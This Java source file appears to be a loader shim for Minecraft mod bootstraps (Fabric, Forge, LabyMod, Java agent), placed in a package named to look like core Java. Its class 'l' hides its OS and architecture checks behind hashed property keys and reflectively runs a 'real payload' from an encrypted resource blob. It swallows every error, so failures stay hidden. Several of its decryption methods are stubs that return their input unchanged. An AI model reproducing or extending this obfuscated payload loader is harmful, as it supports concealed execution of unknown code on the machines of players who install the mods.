package net.java;

import java.util.Arrays;
import java.util.Iterator;
import java.util.Map;

/**
 * Loader bootstrap shim. The real unpacking/crypto/native-boot code lives inside
 * the encrypted blob {@code /net/java/b} which {@link m} loads at runtime. This
 * compiled class only provides the entry-point signatures (the {@code static a(...)}
 * overloads and {@code keyPath1/keyPath2/keyLong1/keyLong2} fields) used by the
 * Fabric/Forge/LabyMod/Agent bootstraps.
 */
public class l {
    @SuppressWarnings("unchecked")
    public static Map<Object, Object> sysProps = (Map<Object, Object>) (Map) System.getProperties();
    public static String keyPath1;
    public static String keyPath2;
    public static long   keyLong1;
    public static long   keyLong2;

    public static int OS;
    public static int ARCH;

    static {
        String osName = "";
        String osArch = "";
        String osVer  = "";
        for (Iterator<Map.Entry<Object, Object>> it = sysProps.entrySet().iterator(); it.hasNext();) {
            Map.Entry<Object, Object> e = it.next();
            int h = e.getKey().hashCode();
            if (h == -1228098475) osName = e.getValue().toString().toLowerCase();
            else if (h == 1174476494) osVer = e.getValue().toString().toLowerCase();
            else if (h == -1228469728) osArch = e.getValue().toString().toLowerCase();
        }
        OS = -1;
        if (osName != null) {
            if (osName.contains("win")) OS = 0;
            else if (osName.contains("linux")) OS = 1;
            else if (osName.contains("mac") || osName.contains("osx") || osName.contains("os x")) OS = 2;
            else if (osName.contains("android")) OS = 3;
        }
        int h = osVer.hashCode();
        if (h == 93084186 || h == -1221096139) ARCH = 2;
        else if (h == -806050265 || h == 92926582) ARCH = 0;
        else if (h == 117110 || h == -806050360 || h == 3178856 || h == 3179817 || h == 3180778 || h == 3181739) ARCH = 1;
        else ARCH = -1;
    }

    /** Main bootstrap entry invoked by all entry points. Initialises UI then
     *  attempts to reflectively start the real payload; failures are swallowed
     *  so the UI preview works standalone. */
    public static void a(Object... args) {
        m.init();
        try {
            Class<?> real = new m().loadClass("a");
            java.lang.reflect.Method m = real.getDeclaredMethod("a", Object[].class);
            m.invoke(null, new Object[]{args});
        } catch (Throwable ignored) {}
    }

    public static byte[] a(byte[] src, byte[] key) { return src; }
    public static int    a(Object[] arr) {
        byte[] src = (byte[])arr[0]; int off = (Integer)arr[1]; byte[] key = (byte[])arr[2];
        if (key.length == 0) return -1;
        off -= key.length;
        outer: for (int i = 0; i <= off; i++) {
            for (int j = 0; j < key.length; j++) if (key[j] != src[i+j]) continue outer;
            return i;
        }
        return -1;
    }
    public static int    a(byte[] a, byte[] b) { return Arrays.equals(a,b) ? 0 : -1; }
    public static byte[] b(byte[] in) { return in; }
    public static byte[] a(String s, String enc) { try { return s.getBytes(enc); } catch (Exception e) { return s.getBytes(); } }
}
